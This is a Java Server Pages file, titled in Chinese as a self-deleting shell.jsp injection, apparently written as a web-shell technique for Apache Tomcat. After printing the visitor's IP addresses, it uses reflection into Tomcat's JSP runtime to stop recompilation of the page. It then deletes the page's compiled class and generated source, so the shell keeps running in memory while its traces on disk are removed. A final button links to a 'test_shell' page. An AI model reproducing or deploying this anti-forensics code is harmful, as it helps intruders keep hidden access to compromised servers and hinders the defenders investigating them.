<%--
  Created by IntelliJ IDEA.
  User: DELL
  Date: 2023/4/28
  Time: 15:00
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.mapper.MappingData" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="org.apache.jasper.compiler.JspRuntimeContext" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="java.util.concurrent.ConcurrentHashMap" %>
<%@ page import="org.apache.jasper.servlet.JspServletWrapper" %>
<%@ page import="org.apache.jasper.JspCompilationContext" %>
<%@ page import="java.io.File" %>

<html>
<head>
    <title>实现shell.jsp注入自删</title>
</head>
<body>
<h2>
    shell is opening
</h2>
<h2>

<%--//代理服务器地址--%>
<%--//这种方法在大部分情况下都是有效的。但是在通过了Apache、Squid等反向代理软件就不能获取到客户端的真实IP地址了。--%>
<%--//如果使用了反向代理软件，用request.getRemoteAddr()方法获取的IP地址是：127.0.0.1或192.168.1.110，而并不是客户端的真实 IP。--%>
    <%
    out.println("代理服务器IP地址：" + request.getRemoteAddr()+"</br>");
    %>
    <%--客户端IP地址--%>
    <%!
    public String getRemortIP(HttpServletRequest request) {
        if (request.getHeader("x-forwarded-for") == null) {
            return request.getRemoteAddr();
        }
        return request.getHeader("x-forwarded-for");
    }
    %>
    <%
    String clientIP = getRemortIP(request);
    out.println("客户端IP地址：" + clientIP);
    %>
    <h2>
<br/>
<%
    Field requestF = request.getClass().getDeclaredField("request");
    requestF.setAccessible(true);
    Request req = (Request) requestF.get(request);
//    out.write("1");
    MappingData mappingData = req.getMappingData();
    Field wrapperF = mappingData.getClass().getDeclaredField("wrapper");
//    out.write("2");
    wrapperF.setAccessible(true);
    Wrapper wrapper = (Wrapper) wrapperF.get(mappingData);

    Field instanceF = wrapper.getClass().getDeclaredField("instance");
//    out.write("3");
    instanceF.setAccessible(true);
    Servlet jspServlet = (Servlet) instanceF.get(wrapper);

    Field rctxt = jspServlet.getClass().getDeclaredField("rctxt");
//    out.write("3");
    rctxt.setAccessible(true);
    JspRuntimeContext jspRuntimeContext = (JspRuntimeContext) rctxt.get(jspServlet);

    Field jspsF = jspRuntimeContext.getClass().getDeclaredField("jsps");
//    out.write("3");
    jspsF.setAccessible(true);
    ConcurrentHashMap jsps = (ConcurrentHashMap) jspsF.get(jspRuntimeContext);

    JspServletWrapper jsw = (JspServletWrapper)jsps.get(request.getServletPath());
    jsw.setLastModificationTest(8223372036854775807L);

    JspCompilationContext ctxt = jsw.getJspEngineContext();
    File targetFile;
    targetFile = new File(ctxt.getClassFileName());//删掉jsp的.class
    out.println(targetFile);
    targetFile.delete();
    targetFile = new File(ctxt.getServletJavaFileName());//删掉jsp自身
    targetFile.delete();
    out.println("targetFile:"+ targetFile);

%>
        <form action="test.jsp" method="post">
            <button type="submit">跳转到test_shell</button>
        </form>
</body>
</html>
